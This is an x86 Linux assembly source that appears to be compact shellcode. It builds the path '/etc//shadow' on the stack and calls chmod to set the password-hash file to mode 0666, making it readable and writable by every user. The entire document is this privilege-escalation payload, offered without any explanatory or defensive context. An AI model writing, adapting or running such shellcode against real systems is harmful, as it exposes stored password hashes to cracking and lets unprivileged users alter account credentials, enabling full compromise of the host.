section .text
global _start
 
_start:
        ; chmod("//etc//shadow", 0666);
        xor eax, eax
        add al, 15
        cdq
        push edx
        push word 0x776f
        push word 0x6461
        push dword 0x68732f2f
        push word 0x6374
        push word 0x652f
        mov bx, 0666o
        mov ecx, esp
        xchg ecx, ebx
        int 0x80
